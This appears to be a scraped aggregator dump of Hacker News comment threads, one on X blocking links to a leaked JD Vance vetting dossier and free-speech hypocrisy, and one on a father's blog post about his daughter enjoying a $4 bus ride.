JD Vance one. reply arctics 22 hours agoprevI scrolled over the dossier and there nothing significant there, most of it is bunch of things he said, his investments, property, donations, tickets, taxes and so on. Most of the information can be found online, this is just complied into one PDF file. reply karlzt 18 hours agoparent>> complied compiled reply tptacek 22 hours agoparentprevThis is why no major media outlet ran this story when the hackers offered the documents a month or two ago: there's literally nothing in it. It's a standard opposition research report. The Harris campaign has a document just like it on their own Google Drive. It isn't even directionally interesting; it records every line of attack the GOP could imagine Vance facing (they missed \"childless cat ladies\", though!), and so calls out places where Vance is in line with Trump as well as places he isn't. All the real stories about this piece are going to be from people like Klippenstein and Musk beclowning themselves over it. reply LorenPechtel 21 hours agorootparentStreisand effect. The dossier doesn't matter. The fact they are blocking it does. reply spamizbad 22 hours agorootparentprevThe omission of the \"Childless Cat Ladies\" comment is arguably pretty newsworthy since it has a bunch of implications, most notably being its the attack line that likely drew blood so to speak (the other a potential campaign blind-spot for how to communicate with female voters, a demographic the Trump campaign has struggled with) reply SpicyLemonZest 21 hours agorootparentIt's just so stacked in conditionals, and the document doesn't even prove whether they didn't consider it a problem or just didn't know about it. I'm not saying it's some tragedy that this document got published, but it makes perfect sense to me that big newsrooms didn't think there was anything in here worth becoming a mouthpiece for some anonymous \"Robert\" guy. Independent journalists have more flexibility in this kind of thing because they don't have to develop and enforce editorial policies. Presumably newspapers will have more to say about the dossier now that it's already public. reply ajross 21 hours agorootparentprevRight, the argument being that the Trump campaign oppo folks are redpilled and unable to apply a cynical eye to arguments made from outside their echo chamber. And I guess that's possible, but I think the simpler explanation is just that they're lazy. Trump himself was going to pick whoever he wanted, everyone knew it. There's no point in going the extra mile to support a process you know is going to be ignored. So check the boxes you need to and move on. reply rideontime 22 hours agorootparentprevIs Klippenstein self-beclowning? He readily admits in the piece that it's pretty much a nothingburger. reply nickthegreek 18 hours agorootparentHe is using it as advertising. Saying he will publish what others won’t so subscribe to me. reply rideontime 5 hours agorootparentIs that a bad thing? reply jeffbee 22 hours agoparentprevWhat PDF reader would you trust to open and run a document reportedly produced by Iranian intelligence? reply hn_acker 4 hours agorootparentRather than a PDF reader, how about a PDF sanitizer? I've heard of Dangerzone [1][2], though I've never used it. [1] https://github.com/freedomofpress/dangerzone [2] https://dangerzone.rocks/ reply Psillisp 21 hours agorootparentprevMy Nintendo Switch reply jimjimjim 21 hours agorootparentprevAny reader that has only bothered to implement pdf object processing and page rendering. Or just any pdf reader that doesn't have pdf javascript implemented reply phatfish 22 hours agorootparentprevI used Firefox. reply mayneack 21 hours agoparentprevYeah, the only novel info in this story is the twitter suspension. Very counter productive if Elon was trying to suppress this. reply Hizonner 22 hours agoprevWhat could possibly in there that would be more damaging than what you can get for free by waiting for Vance to open his mouth in public? reply malshe 21 hours agoparentSomeone on Bluesky said something to the effect that nine out of ten times the shooting around Trump is just JD Vance shooting himself in the foot reply bdjsiqoocwk 21 hours agorootparentAnd the tenth time they miss. reply wtfwhateven 14 hours agoprevSo posting publicly available information gets someone banned but people can post horrific videos of children being abused with no punishment? https://www.dailydot.com/debug/elon-musk-reinstates-child-ab... reply adultSwim 2 hours agoprevThere is no evidence how the document, commissioned by the Trump team while vetting Vance, got out. I'm reminded of Facebook suppressing the New York Post's Hunter Biden story in 2020, minus any noteworthy revelations. reply turingfeel 20 hours agoprevMuch of the dossier reads like it was written by ChatGPT. Similar style and structure of paragraphs. I think a Trump campaign staffer got a little lazy. reply rllearneratwork 21 hours agoprevMajority of Elon's net worth is tied to Tesla. Tesla has a massive presence in and therefore dependence on China. How can we accept Twitter as a free-speech platform? Just because he says so? reply two_handfuls 17 hours agoparentTwitter is obviously not a free speech platform, as demonstrated by basically anyone posting things critical of Musk or his allies. reply 2OEH8eoCRo0 22 hours agoprevSo much free speech! reply hiddencost 22 hours agoprevhttps://youtu.be/1sbZLhuaZIY Duck Sauce - Barbara Streisand (It's just a really catchy song. And I suspect this block will backfire.) reply worstspotgain 22 hours agoprevnext [5 more] [flagged] threeseed 22 hours agoparentYou don't need to be a Musk supporter to be critical of OpenAI. In fact you would hope that wanting ethical behaviour would be universal. reply worstspotgain 22 hours agorootparentSo you're saying that if A->B, then it's not necessarily the case that B->A? /s reply worstspotgain 21 hours agorootparentThey showed up like clockwork and flagged the GGP post. I've posted ~15 Musk-critical comments in the last month and ~13 got flagged within an hour, usually within 15 minutes. Try getting that by criticizing OpenAI, or basically any non-Musk company. reply Freedom2 22 hours agoparentprevI don't doubt this will get flagged, but not for the reason you think. I think it's important that this meets the criteria of spurring 'curious' discussion, of which this might just devolve into flamebait and arguments without much intellectual curiosity to be found. reply jonathanyc 22 hours agoprevOn the one hand, Musk has already retracted his claim[1] that he's a \"free speech absolutist\"[2], so I don't think it's fair to come after him for that: In last month’s interview with the BBC, Musk said, “the rules in India for what can appear on social media are quite strict, and we can’t go beyond the laws of a country … If we have a choice of either our people go to prison or we comply with the laws, we will comply with the laws.” At another point in the interview, Musk said: “If people of a given country are against a certain type of speech, they should talk to their elected representatives and pass a law to prevent it.” But blocking links to hacked documents regarding JD Vance seems a little suspect considering that, as the article mentions, he was opposed to blocking links to hacked documents about Hunter Biden: Twitter, before it was bought by Elon Musk, had a policy regarding hacked materials — but the page is no longer available. A pre-Musk version of the policy, dated 2019, stated that posting or linking to hacked content is prohibited. Under this policy, links to a story by The New York Post about Hunter Biden, the current president’s son, were banned. But in October 2020, Twitter changed its policy to say that it would no longer block hacked materials, after an outcry about how the company had handled the Post story. “Straight blocking of URLs was wrong, and we updated our policy and enforcement to fix,” wrote then-CEO Jack Dorsey. Musk was one of the people who was unhappy with the decision to ban links to the Post’s story. “Suspending the Twitter account of a major news organization for publishing a truthful story was obviously incredibly inappropriate,” Musk wrote of the decision on the story in April 2022. He even invited former Rolling Stone pundit Matt Taibbi to examine internal documents showing how Twitter handled the decision. (In the course of tweeting his conclusions, Taibbi exposed the email addresses of Dorsey and Representative Ro Khanna.) [1]: https://www.cato.org/commentary/elon-musk-sues-critics-silen... [2]: https://www.cnn.com/2023/05/29/tech/elon-musk-twitter-govern... reply mmooss 21 hours agoparent> “If people of a given country are against a certain type of speech, they should talk to their elected representatives and pass a law to prevent it.” Yet Brazil's speech laws he publicly flouted and attacked. As a theory worth exploring: Is it because India's government matches Musk's far-right politics (or do they have any direct relationship), and Brazil's does not? Are there other data points we can use? reply intermerda 19 hours agorootparent> Are there other data points we can use? Yes, he has censored information on Erdogan's request as well. He never calls out the censorship from strongmen authoritarians but loves attacking nations with strong democracies. reply mmooss 13 hours agorootparentThanks. We should be careful of confirmation bias, of course: How many authoritarians / far-right causes has Musk obstructed based on free speech? How many non-far right and liberal causes has Musk enabled? reply Veserv 22 hours agoparentprevIt is absolutely fair to continue to point out his ongoing hypocrisy. “If we have a choice of either our people go to prison or we comply with the laws, we will comply with the laws.” in 2023. Here he is on Brazil just a few months ago [1]: “We are lifting all restrictions. This judge has applied massive fines, threatened to arrest our employees and cut off access to in Brazil. As a result, we will probably lose all revenue in Brazil and have to shut down our office there. But principles matter more than profit.” If we have to risk employees going to jail, then we will follow the law. We risk employees going to jail, so we will ignore the law on principle. Literal opposites. He is just a free speech opportunist who realized that you can say “free speech” to get people to overlook your selfish goals and get the benefit of the doubt when you deserve strict scrutiny. [1] https://x.com/elonmusk/status/1776739518240170254 reply SmartJerry 21 hours agorootparentYou must realize this document doxxes JD Vance. Including birthdate, phone number, most of SSN, his home address, criminal history, etc. The dude will have to move now. reply neaden 22 hours agoparentprevAt a certain point, if Musk consistently blocks things favoring one party and not another does X risk losing its Common Carrier status and start opening itself up to more liability? reply philipkglass 22 hours agorootparentIf you're referring to US law, Twitter was never a telecommunications common carrier. So it can't lose that status through any sort of moderation decisions. reply tptacek 22 hours agorootparentprevNo. This is not a thing. reply krapp 22 hours agorootparentprevTwitter (I still refuse to call it X) doesn't have \"Common Carrier\" status, no website or platform does. Section 230 of the Communications Decency Act of 1996 protects platforms from liability for user content even if they display bias towards that content. reply ursuscamp 22 hours agoparentprev>But blocking links to hacked documents regarding JD Vance seems a little suspect considering that, as the article mentions, he was opposed to blocking links to hacked documents about Hunter Biden Per X, the links were blocked because they included un-redacted personal information such as address and SSN. reply orochimaaru 22 hours agorootparentIf that’s true I would say blocking is credible. I’d rather err on the side of caution on exposing potential privacy information. If there was no private info - obviously the block is b.s. But considering they’ve mentioned privacy details in the doc I’m prepared to give them the benefit of doubt for a few days or ask the initial poster to send a redacted version. reply SpicyLemonZest 22 hours agorootparentI'm not gonna spend an hour poring over the thing for an SSN, but it does have his unredacted home addresses in both Ohio and DC. reply reaperducer 21 hours agorootparentit does have his unredacted home addresses in both Ohio and DC. In the United States, the addresses of politicians are public records. It's how journalists and the general public verify that they live in the districts they are elected to represent. reply SpicyLemonZest 20 hours agorootparentThe policies of the United States government really have nothing to do with the policies a social media website can or should enact. I'm honestly not sure what I think of this precise situation, but it's not crazy to think that nothing good will come from running around posting the home addresses of unpopular politicians. reply slantedview 21 hours agorootparentprevHis address is public info, available on dozens of state and local election sites. For comparison, Elon previously leaked \"the Twitter files\" to reporter Matt Taibbi, who posted the address of prior Twitter executives. Needless to say, Taibbi was not banned. reply FergusArgyll 20 hours agorootparentprevI couldn't find an SSN but my regex is mid reply blitzar 21 hours agorootparentprevPer Elon, photos of Hunter Bidens penis was a public interest story. reply foldr 21 hours agoparentprev>Musk has already retracted his claim[1] that he's a \"free speech absolutist The article you link shows that his subsequent actions are inconsistent with that claim, but not that he's 'retracted' it. Musk has repeatedly said that Twitter will allow 'all legal speech'. There's nothing illegal about sharing links to this document in most jurisdictions (certainly not in the US). reply smsm42 16 hours agoprev [–] The vibe I am getting here is that if somebody enables people who criticize government decisions and policies in a way that the government considers \"dangerous\", he's an evil idiot and doesn't understand what \"free speech\" is and something \"needs to be done\" about him. But if somebody publishes his political opponent's home address, phone number, SSN and other details who have absolutely no bearing to any political discussion, but may seriously jeopardize their personal safety in an environment where trying to shoot a presidential candidates is becoming a routine event - then in the name of free speech this must be allowed to be published, no restrictions. I think people that take such position care very little about free speech and a lot about hurting people who have different politics than they do. And they are part of what is wrong with the politics today. reply olliej 16 hours agoparent [–] No, the issue people are having is musk claims he has to allow nazis, transphobes, homophobes, racism, sexism, fake pornography of people, etc because otherwise it would be censorious and an attack on free speech. But things that attack or are damaging to him or his beliefs are frequently censored. The issue is not what he chooses to censor or not censor. The issue is that he claims that the reason he chooses not to censor horrific abuse and attacks on minorities is because he’s a free speech absolutist and all censorship is bad. He hides behind the claim of the sanctity of free speech as the justification for what he allows, publishes, and promotes, when he very clearly holds, and enforces, no such belief. Posts like this that claim that people are just disagreeing about politics, when the political viewpoint on one side is that the other side has no right to exist are entirely demonstrative of people who are so bigoted that they don’t see their own bigotry as that, because it could only be bigotry if the targets of their bullshit were people, which to them they aren’t. reply smsm42 15 hours agorootparent [–] > he has to allowbecause otherwise it would be censorious and an attack on free speech Yes. Because all these people, however unpleasant their speech may be for you or me, have the same right to speak their mind on the questions of public importance as you and me. Yes, even racists. However, publishing somebody's private information that can easily lead to deadly attack on him or his family is in entirely different class of speech. It does not contribute to any public discussion or does anything positive, just endangers people and enables violence. It is not severe enough to make the law involved, but it is going far enough that restricting it on social media is summarily a positive thing. The owner of the social media platform has to draw the line, which speech is allowed on the platform and which is not. Some would draw it on \"anything legal is allowed\". Some would even do \"anything is allowed\" but those will find themselves in trouble with the law pretty quickly. Some would say \"some legal speech - like porn - is not allowed\", or \"some legal speech - like revealing private information of public figures and their relatives - is not allowed\", etc. These are valid choices (as it is valid to criticize them), and they are not inconsistent at all. You can support free speech without supplying your platform to organize attacks on public figures or hurting their families. You do not have to be \"all or nothing\" - and in fact, nobody has advocated \"all or nothing\" policy towards Twitter or Facebook or any of the social media platforms ever, before Musk. Now, because Musk is also not \"all or nothing\" - as is everybody else - how is he any special? His line is such that publishing private information about people that can hurt them is not ok, good for him I say. > when the political viewpoint on one side is that the other side has no right to exist Yes, I know, you only have to be bad because your opponents are so much worse. Always a good excuse. It is totally OK for good people to be bad to bad people, after all, we are good people and they are bad people, that makes it right when we do it to them, but wrong when they do it to us! reply olliej 14 hours agorootparent [–] > However, publishing somebody's private information that can easily lead to deadly attack on him or his family is in entirely different class of speech. Got it, encouraging people to execute gay and trans people is completely fine, and is clearly nowhere near as bad as publishing information sent by a person running for vice president. I get your point, on the one hand the people saying \"LGBT/black/hispanic people are not actually people and don't have the right to exist\" are only causing harm to people who aren't really people. On the other hand you have the emails and information about a major public figure running for political office with secret service protection who is running on a platform of \"brown people are illegal and killing your pets, and lgbt people should be illegal\" while encouraging bomb threats against minorities. > The owner of the social media platform has to draw the line, His entire justification for not restricting attacks on minorities is free speech, he actively promotes false information about political groups he does not like, while actively censoring things like this that are, again, a dossier about a public figure running for a major office. So his line is \"anything, no matter how wretched, gross, false, or fraudulent, as long as it doesn't attack my political friends\". Stop pretending these are equivalent. > > when the political viewpoint on one side is that the other side has no right to exist > Yes, I know, you only have to be bad because your opponents are so much worse. The idea that a leaked \"dossier\" about a public figure is somehow \"bad\" is so fucking bullshit. The fact that you consider this equivalent to promoting violence against minorities tells me everything I need to know about your world view. The fact that you think leaking a dossier about a political candidate is \"bad\" tells me that your opinion is free speech ends once it hurts political figures, which means I don't give a shit about your position. I'm glad I'll never meet you, and I hope you're never in a position where someone vulnerable depends on you. reply matwood 7 hours agorootparentThe hypocrisy of Musk around 'free speech' has been on full display since he bought Twitter. It's wild to me that you're still having to argue with people on this point. Twitter is a Musk Speech platform, and has very little to do with free speech. reply smsm42 1 hour agorootparentprev [–] > Got it, encouraging people to execute gay and trans people is completely fine, Please stop it. Nobody advocated executing gay and trans people here, and nobody said it is \"completely fine\". Stop lying, please. > on the one hand the people saying \"LGBT/black/hispanic people are not actually people and don't have the right to exist\" There are no such people, at least not in the numbers worth mentioning, in the US (there are in other countries, but curiously you don't care about that at all, do you?). You are just whipping yourself into a frenzy by imagining something that doesn't exist but it would be nice if they did because that would justify you hurting your political opponents - after all, they are so, so bad! > So his line is \"anything, no matter how wretched, gross, false, or fraudulent, as long as it doesn't attack my political friends\". Again, this is a lie. X prohibits a lot of content that has nothing to do with \"attacks\" on supposed Musk's \"political friends\". I just recently personally saw one prominent political article \"restricted\" on X because it mentioned (in a quote) certain slur word, for example. And I witness a lot of fraud deleted (not 100%, true, but that's impossible). Again, you are being completely false here. > The idea that a leaked \"dossier\" about a public figure is somehow \"bad\" is so fucking bullshit. Yes, it is bad, in this particular case. It does nothing but hurting people, including people that are not related to any political involvement, and does not contribute in any way to the society. You can not name any cause or any group that would be better off by the fact that these private details are public. How would publishing Vance's SSN be useful? Does it protect \"LGBT/black/hispanic people\" somehow? No. The only way one could use them is to commit personal attacks on his person and the persons of his relatives. I am hoping you would at least stop before advocating that. Though these days one can't be sure anymore. > The fact that you think leaking a dossier about a political candidate is \"bad\" tells me that your opinion is free speech ends once it hurts political figures, And again, you keep ignoring the fact we're talking about private information, like home addresses, SSNs and so on. You try to present it as if it a purely political dossier of political nature that has some societal value. It might be the case if the leaker bothered to redact out the private information - but they didn't, and they probably didn't because beyond that, this document contains pretty much nothing interesting. It's as boring and mundane as the content of my \"old bills\" drawer. The only purpose to publish something like this could be to personally hurt a political opponent - no other goal is achieved by it. And the fact that you are consistently refuse to address this issue - the issue of publishing private information, having no significance in public discussion - makes me suggest you are actually ok with it. Your belligerent tone and baseless false accusations confirm it quite nicely. If you want to know what's wrong with the politics today - look at the mirror, it's you and your hate. I hope you find a way to move beyond it one day. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Twitter, now rebranded as X, has blocked links to a newsletter containing a hacked document allegedly from the Trump campaign about JD Vance, citing a violation of rules on posting unredacted private information.",
      "Journalist Ken Klippenstein, who published the newsletter, has been suspended, and attempts to share his newsletter on X resulted in error messages.",
      "X did not provide a detailed explanation for the link ban, though it aligns with its revised 2020 policy against posting hacked materials."
    ],
    "commentSummary": [
      "X (formerly Twitter) blocked links to a hacked JD Vance dossier, but the block could be bypassed by adding a query parameter to the URL.",
      "Twitter later required users to delete posts containing these links, though the block was poorly implemented and easily circumvented.",
      "The incident has sparked debates about free speech, privacy, and the influence of Elon Musk on Twitter's inconsistent blocking policies."
    ],
    "points": 200,
    "commentCount": 116,
    "retryCount": 0,
    "time": 1727381344
  },
  {
    "id": 41671145,
    "title": "The best $4 ever spent",
    "originLink": "https://papanotes.com/the-best-4-ever-spent",
    "originBody": "Papa Notes 🎧 The Papa Notes Podcast 📺 Conversations on YouTube The best $4 ever spent Anton Savinov on Unsplash\"> Photo by Anton Savinov on Unsplash Kids get excited about things that are very different from those of adults. You probably remember your kid's first birthday. The members of the extended family all wanted to spoil her. They brought fun gifts. Useful and useless ones. They brought toys recommended by the best parent influencers. They looked at your child with excitement, as she was unwrapping the gifts with you. But she didn't seem to... care? \"No, no don't play with the wrapping paper! Look at the truck vroom vroom!\" to no avail. She preferred the wrapping paper. A few weeks ago, I had to drive my car to the workshop for servicing. My five-year-old daughter wanted to tag along. Ok, I thought, this won't be super fun for her as I'll have to wait a couple of hours to get the car back, but it will be an opportunity to spend some time together, just the two of us. We dropped the car, and went on to run a couple of errands. We also had lunch at IKEA (don't ask me why, but Swedish kids love eating there.) But after a few hours, the car still wasn't ready. \"Let's take the bus home!\" my daughter said. What a terrible idea. It would take an hour and two busses to get there, and I would most certainly get a call to come and pick up the car as soon as we'd arrive home. Terrible. \"Ok, let's do it,\" said I reluctantly. I know how much my daughter enjoys riding the bus. We never do it, so every time feels special. Seeing how happy she was, it was all worth it—best $4 I've ever spent. What's something a bit counter-intuitive you could do to delight your child this week? P.S.: When we finally got home, it was, as anticipated, time to pick up the car. I was planning on taking a taxi but ... Sophie asked if we could ride the bus back there. No regrets! Newsletter Subscription Receive the latest and subscriber only articles Subscribe Recent posts It's fixable Everybody struggles Careful with that exaggeration Home Greg Gilbert's blog Papa Notes on Substack (deprecated) © Papa Notes, 2024. RSS feed ×",
    "commentLink": "https://news.ycombinator.com/item?id=41671145",
    "commentBody": "The best $4 ever spent (papanotes.com)176 points by pmzy 4 hours agohidepastfavorite66 comments aantix 3 hours agoWe took our kids to Disney World once. When asked what their favorite part of the trip was, they responded.. The hot tub. At the hotel. My kids light up the most when I am fully engaged with them, fully present, entertaining their ideas, and asking questions. Their favorite family trip so far? When we traveled to Arkansas to mine for crystals. AKA, dig in the dirt all day. They saw it on a YouTube video. They asked to go. So we obliged. I had never been to Arkansas. It's beautiful. We stayed at a resort, Diamonds Old West Cabins, with a huge playground outside the cabins, archery, and a bubble party every evening at 6 pm. They still talk about that trip. reply gk1 28 minutes agoparent> My kids light up the most when I am fully engaged with them, fully present, entertaining their ideas, and asking questions. Exactly. The author didn't mention it but it's not just the bus ride, it's how they engaged with their daughter during that ride. Remember the mania over the total eclipse in April in the US? I took my daughter on 250-mile roadtrip to see it. The drive took a few hours there, then 9 (!!) hours back because of horrendous traffic. It could've been a disaster, but because I knew it's going to be such a long drive I committed to stayin upbeat, fun, and fully engaged the entire time. It was a fantastic time that brought us closer together and we still talk about it fondly. Oh and the total eclipse, we didn't even get to see it ... 95% cloud coverage. reply DowagerDave 2 hours agoparentprevFor our Disney(land) trip, we stayed at a motel ~ 1.5 miles from the park (Canadian walking distance) and the thing my kids LOVED was we walked by a 7-11 every day and I would buy them a slurpee on the morning walk to the gates. Probably $20 for the week (and likely not much worse for you than a typical vacation breakfast). The \"make your own waffle\" station at the included breakfast was also a huge hit. The park and rides were satisfactory. reply dmd 1 hour agorootparentI've taken my older daughter to Disney (World) twice now (at ages 7 and 9). Her absolute favorite part: riding the Skyliner to EPCOT. On our second trip we went an hour out of our way to go ride it because we weren't at a served hotel that time. When pressed for a favorite activity within the park, it was \"that time we ran all the way from Japan to Soarin', dodging people\". reply tomkaos 6 minutes agoparentprevI have travel entire Vietnam with people with kids. After seeing all the pagoda, park, cave, amusement park.. the best part of the travel for the kid was the pool at one hotel. reply 98codes 2 minutes agoparentprevI had a similar experience -- their (age 2 & 5) favorite thing? Was it the rides, meeting all the characters? No. The parking lot tram. reply justusthane 1 hour agoparentprevA few months ago, we took our year-and-a-half-old daughter to Belgium and Spain for two weeks. Her favorite part of the whole trip was seeing horses, sheep, and geese (all of which, believe it or not, we have here at home in Canada). reply quercusa 6 minutes agorootparentWhen I was about seven, my sister and I were taken on a special trip to see the Giant Pandas at the National Zoo in Washington, DC. The pandas were fine, but we were fascinated by the chipmunks running around everywhere. reply chazeon 2 hours agoparentprevEven as an adult I enjoy time when some other person I am spending time with is fully engaged and fully present, I’d call it quality time, but it’s just so rare… reply atoav 2 hours agoparentprevMy little brother once got a bicycle for christmas. He played the whole evening with the cardboard box it was in. reply torbengee 1 hour agorootparentConsider the possibility that your brother might be a cat ... reply drcongo 1 hour agoparentprevFirst time I took my eldest to London Zoo, we asked her what her favourite part was, she said \"the puddle\". reply abeppu 2 hours agoprevCertainly it's true that kids can get a lot of joy out of something that to an adult seems really small or boring. But the flip side is kids can get totally emotionally distraught or enraged over tiny things. Are these two sides of the same coin, and come from having just a smaller world, where small things can feel very big to a developing brain? Or as an adult with a fully-formed brain and access to the larger world, can we separate them and find that kind of unrestrained joy in the small stuff without also being swept away by small disappointments? reply Qworg 1 hour agoparentI think many adults also get distraught or enraged by tiny things - it is an emotional regulation problem, not an age problem (but adults can and should be better than children). reply LUmBULtERA 1 hour agoparentprev>But the flip side is kids can get totally emotionally distraught or enraged over tiny things. Oof isn't this the truth. The tiniest things will drive my son into full meltdowns right now. reply j7ake 2 hours agoparentprevYes. Basically kids can have strong emotional reactions to seemingly small things. reply xwowsersx 2 hours agoprevThis really hits home. Like everyone, I tend to fall into routines and get comfortable with the familiar. But having kids constantly pushes you out of that comfort zone because they're excited by things that might seem small or inconvenient to you. Embracing their enthusiasm is not only good for them but for you too. It brings some variety and breaks the routine. I always have to resist the urge to tell my kids, \"No, we're not doing that because...\" Just going with the flow and joining in their little adventures is incredibly rewarding. It's not just about making them happy—you gain just as much. Their joy is just the bonus. reply docdeek 3 hours agoprevWhen I was a kid in suburban Australia my parents would organize a semi-annual ‘bus-train-ferry’ trip. It was a school holiday tradition where - in hindsight - we’d do the sort of daily commute that thousands of working adults would do every morning…except for a kid the magic of a bus to a train station, a train into the city, and then a ferry across the river was just great fun. A day ticket for a family back in the 1980s? Probably next to nothing, but a priceless memory. reply stevekemp 3 hours agoprevI went to the transport office and got a map of all the local tram routes - we hung it on the wall, and my child and I rode every tram from one end to the other. Took a few weeks to ride all the trams in Helsinki, and it got a bit boring towards the end as several tram routes terminated in the same location. But every tram we'd get on in the middle, ride to one end of the line and go out for a walk, then ride to the other end. Recently I suggested we do it again, as the trams have been renumbered a little, and there are two new lines available but he's lost interest. Shame, but doing the original routes was a lot of fun and I still have the route map on my wall along with the star-stickers we placed on it to mark the route numbers we'd completed! reply cpfohl 3 hours agoprevFor my middle child's 1st Birthday we realized we could give him everything he ever wanted for about $8. He opened a few boxes of bandaids, tissue boxes, and a roll of toilet paper. Played for hours. reply j7ake 2 hours agoprevThe issue is you don’t know which of the 0-5 dollar products to spend that will make them excited. A strategy is therefore to buy lots of cheap stuff and experiences, and let the kids have the option to choose. Then throw away the stuff they don’t care for. If you buy expensive things, you tend to try to force that thing onto the kid, which can be counter productive. reply janalsncm 32 minutes agoparentIn this case she asked to take the bus. I suppose that could’ve gone south, though. I think kids are generally delighted by novelty. reply millzlane 1 hour agoparentprevPen and paper are my go-to. Throw in a \"wow that's beautiful!\" And they will draw all day. reply criddell 1 hour agoprevWhen I was five or six, my grandmother took me and my siblings on a train to Toronto (maybe a two hour trip) around Christmas to walk down some street (no idea which) and look at the Christmas displays in shop windows. It was all magic to me. I don't think we ever bought anything although she must have fed us something. It's one of my favorite memories and I still love trains. I'm hoping to ride Via from Toronto to Vancouver in a cabin car someday soon! reply LUmBULtERA 3 hours agoprevI took a bus home with my toddler one day when waiting for the planned ride was going to take a longer time than I was originally expecting. I didn't think much of it, but for him the bus ride was WAY more interesting than the zoo we had just visited! reply pmzy 3 hours agoparentthank you so much for sharing your story :) reply mzs 3 hours agoparentprevexperienced the same with train to museum reply stephen_cagle 1 hour agoprevThis sort of content feels good in the immediacy but ultimately lessens the quality of hn. I'm not concerned about this post specifically, but I feel that we should be more critical of things like this making it onto hn. I come to hn to mostly hear about tech, tech advances, startups, etc. I don't come here to read feel good (and admittedly, very cute) stories. They have their place, but I feel that place is not hn. reply jll29 18 minutes agoparentI come to HM for technology matters, but I am genuinely interested to see that the many geeks here from hardware nerd over full-stack developer to investor or founder are all also human beings that have ordinary lives and ordinary problems. It is valuable content to read on HN how fellow geeks see other spheres of life. reply j2bax 1 hour agoparentprevMaybe a little bit of humanity and feel good is just what HN needs! These computers and software and such are after all for... humans mostly. reply millzlane 1 hour agorootparentComputer issues are easy. I could do it all day. But those human problems are tough to crack. reply stephen_cagle 1 hour agorootparentprevMaybe so, this is a public community and the community will decide on its own standards (as it should be). My opinions are my own. I can't exactly draw the line about what does belong on hn, but a question I sometimes ask myself is \"Would I be rolling my eyes if I read similar content on Linkedin?\" If so, I assume it shouldn't be on hn. reply j2bax 59 minutes agorootparentI can agree that I wouldn't want to see this type of content take over HN... and I don't think it would. But a little sprinkled in seems fine. reply cloverich 53 minutes agoparentprevIMO the near constant dismissive, negative, and / or non-constructive criticism is what devalues HN. Genuine curiosity, sharing of contextual and tangential experiences, and constructive criticism are what makes it great. At its best its only about technology because thats where many inquisitive types end up. In this particular case, the spark it ignited in me and others was precisely that inquisitive nature - about eschewing the expected value in lifes activities and instead reaching for that inner genuine interest can turn many experienced upside down. Maybe in reaching too far, but that was my take away from it. If similar stories were reposted ad nauseum i doubt they would make the front page and thus for me at least i am unconcerned with its presence. reply millzlane 1 hour agoparentprevAt the risk of sounding old and cranky I'm inclined to agree with you. The story made me smile no doubt. But I was not expecting a public transportation story. reply pmzy 25 minutes agoparentprevOP here. I see where you're coming from and I even agree with you. I seek and like tech posts on HN. That being said, I enjoy reading (and writing) human stories as well! Plus, it's nice to read the many stories people are sharing in the comments of this post. It shows that our community isn't as cold/ruthless as some may think :) reply RandomThoughts3 1 hour agoparentprevI think the comment about the kid liking the puddle the best at the zoo is the best comment I have read on HN in the past decade. 90% of HN is off topic drivel, pointless ranting , overall tired and unoriginal, when it’s not flat out wrong. I include most of my contributions in these 90%. Genuinely interesting contributions are then few and far between amongst the 10% which actually desserve to exist. If it’s quality you seek, you can close your account right now and go do something useful with your time instead. At least, this post is soulful and happy. reply divbzero 1 hour agoparentprevI don’t mind it in small doses and trust the community to vote appropriately. Even the Wall Street Journal has lighthearted “A-hed” articles, which have occupied valuable space on their front page for 83 years and counting. reply RobinL 2 hours agoprevYesterday the rain was torrential when I picked up my 5yo from school with my 2yo. I brought wellies and we walked up and down the streams of water running down the hill. The kids were more excited than anything we've paid for recently. reply mmikeff 3 hours agoprevSpending time with kids > giving stuff to kids. reply nvalis 2 hours agoparentI would say this applies to more than just kids, this is the case for almost everyone. reply wenc 7 minutes agoprevForget about toys. Kids love big cardboard boxes. My nephews and nieces love them. I’m middle aged but I remember building so many make believe things out of boxes. All I needed were markers, glue and paper. My parents couldn’t afford those mini cars so I built them myself. Out of boxes. A big box could be a car. Or a fort. Or a castle. Or a boat. reply theginger 2 hours agoprevMy son loves to ride a bus too, I'm not a fan, and near me buses are single deck, quite old and unpleasant and really quite expensive. I discovered they city park and ride scheme was the perfect solution. It's cheaper than parking in the city centre and unlimited bus rides to and from the centre on nice new double decker buses. reply ajdude 3 hours agoprevWhen I was growing up, it was a Christmas tradition for my family to take the local train system (SEPTA) from Delaware to Philly to visit the exhibits at the old Gallery mall. It was a rough, dirty, and crowded ride, and it felt like forever as it stopped at every station. My grandparents would take my mother when she was growing up. Decades later it still left a positive impact on me. reply kylehotchkiss 2 hours agoprevThis was very sweet :’) I wish my dad would have said yes to the train more when I was a kid. Now he’s the one asking me to ride one. reply PaulHoule 51 minutes agoprevKids usually love taking transit. reply brink 2 hours agoprevI've been spending my entire adult life trying to rediscover this spiritual joy of being a child. I remember it so fondly. My daughter is about to turn 2 and I'm secretly hoping that she can help me find at least a little of it. reply foobarian 59 minutes agoparentA while ago I was at our patio table with my 4 year old, we were building a house/castle thing out of scrap cardboard. At one point while painting it she pauses and looks over at the garden/woods. I asked her what she saw, she smiled at me and said, \"I'm just... happy.\" I'll never forget it :-) reply waciki 18 minutes agorootparentthis is beautiful, thanks for sharing. reply krunck 1 hour agoprevDo the things that will give your kids the greatest exposure to different ways of being, living, and seeing. That ain't done by having entrenched routines. reply throw0101d 2 hours agoprevThere is no such thing as \"quality time\" together, there is only time together. Bigs things happen in the little moments, and you have to have those little moments for them to happen. reply criddell 1 hour agoparentI don't know... I've been to restaurants where two adults and two kids are sitting at a table. The adults looking at their phones and the kids watching something on tablets makes for poor chances of an interesting little moment to happen. reply grecy 3 hours agoprevFor their 3rd Birthday the daughter of a friend just wanted to ride the bus. So all our friends and their kids got on the right bus at the right time and place so we were all on the bus by the time the Birthday girl got on. We had a riot of a time going around our little town, and the bus driver and other passengers all sang Happy Birthday and “the wheels on the bus” Brilliant idea for a memorable 3rd Birthday! reply kaustubhvp 2 hours agoprevThis kind of stuff I like reading on HN! reply fattybob 3 hours agoprevAbsolutely wonderful tale - I laughed out loud at that final touch! reply lovegrenoble 1 hour agoprevLovely story reply millzlane 1 hour agoprevaww r/mademesmile reply jamiehoward 3 hours agoprevLove this! reply ada1981 2 hours agoprevIt's as if shes hard wired for public transport in an effort to have a future planet to live on! reply dinvlad 3 hours agoprevSo wholesome :-) reply dp-hackernews 3 hours agoprevPriceless! <3 reply pmzy 3 hours agoparentindeed! :D reply psadri 2 hours agoprevA reminder that $ != happiness reply theflyinghorse 2 hours agoprev [–] Is this not an 